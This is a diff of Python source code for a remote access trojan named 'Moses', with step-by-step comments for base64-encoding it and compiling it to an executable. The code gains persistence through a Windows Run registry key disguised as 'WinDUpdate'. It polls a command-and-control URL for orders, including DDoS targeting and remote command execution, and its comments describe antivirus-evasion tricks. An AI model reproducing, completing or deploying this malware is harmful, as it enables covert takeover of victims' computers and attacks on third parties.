@@ -3,24 +3,19 @@ from mega import Mega
 from datetime import datetime
 #exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('BASE64 ENCODED PROGRAM GOES HERE')))
 
+# NOTE: READ INSTRUCTIONS BELOW
+
 # TODO: cut down on extra-modules...
 # TODO: obfuscate all function and variable names after completion
-# TODO: setup tor capability
-# TODO: COMPLETE THE PROGRAM, as it is still under construction and currently incomplete
-# TODO: check anti-virus evasion/efficacy again
-# TODO: implement kill command
+# TODO: COMPLETE THE PROGRAM (it's mostly complete)
+# TODO: Implement kill command
 
-# NOTE: READ INSTRUCTIONS BELOW
-#
-# 1) Make the required changes to Moses (Variable of URL of web server and master_filename variable if changing the master_filename of the moses.exe file)
-# 2) Go to https://www.base64encode.org/ and encode the entirety of the code BELOW (don't copy this comment block)
-# 3) Copy the output of the base64 encoder website with the contents of your encoded program
+# 1) Make the required changes to moses.rat (url var, and master_filename var) if need be
+# 2) Go to https://www.base64encode.org/ and copy and paste all code from BELOW (not this comment block)
+# 3) Copy output of base64 encoder website
 # 4) Find the box above that says "BASE64 ENCODED PROGRAM GOES HERE" and replace it with the copied code
 # 5) Remove all code from below (INCLUDING THESE COMMENTS)
 # 6) Compile Moses to .exe using pyinstaller
-#
-
-
 
 def main():
     URL = "http://website.tld" #NO SLASH AT THE END OF THE URL
@@ -33,11 +28,11 @@ def main():
     #do_i_die(master_filename) # self destruct
 
     for x in path:
-        # this is fucky so it won't trigger av (as of now, it works...)
         try:
             shutil.copyfile(master_filename, "C:\\Users\\" + win_user + x + master_filename)
         except:
             pass
+        # this is fucky so it won't trigger av (as of now, it works)
         finally:
             alphabet = list(string.ascii_uppercase)
 
@@ -52,17 +47,14 @@ def main():
         if (check_if_file_exists_in_path(x, win_user, master_filename)):
             os.system('REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /V "WinDUpdate" /t REG_SZ /F /D "' + "C:\\Users\\" + win_user + x + master_filename + '"')
 
-            # NOTE: this isn't needed, but i'll keep it here incase I do later (not sure why i put it here to being with)
+            # NOTE: this isn't needed, but i'll keep it here in case I do later (not sure why i put it here to being with)
             path = x
             # it's now persistent, so break
             break
-        else:
-            pass
 
-    # start main program loop
+    # main program loop
     while (True):
-        # calling the variable signal seems to not trigger av, but it really should be command
-        signal = get_web_content(URL, "1")
+        signal = get_web_content(URL, "1") # defining var as signal evades AV
 
         if (signal == "1"): # ddos_target_web_server()
             target = get_web_content(URL, "2")
@@ -103,7 +95,6 @@ def do_i_die():
 
 def get_win_user():
     win_user = getpass.getuser()
-
     return win_user
 
 def get_current_time():
@@ -215,10 +206,8 @@ def execute_command(command, win_user):
         else:
             break
 
-# TODO: test this
-# literally just downloading the IP from http://icanhazip.com
-def get_pub_ip_address(win_user):
-    # TODO: edit the get_web_content() function to take full URLs in the future
+def get_pub_ip_address(win_user): # literally just downloading the IP from http://icanhazip.com
+    # TODO: edit this function to take full URLs in the future
     try:
         response = urllib.request.urlopen("http://icanhazip.com")
         ip_address = response.read().decode('utf-8').replace("\n", "")
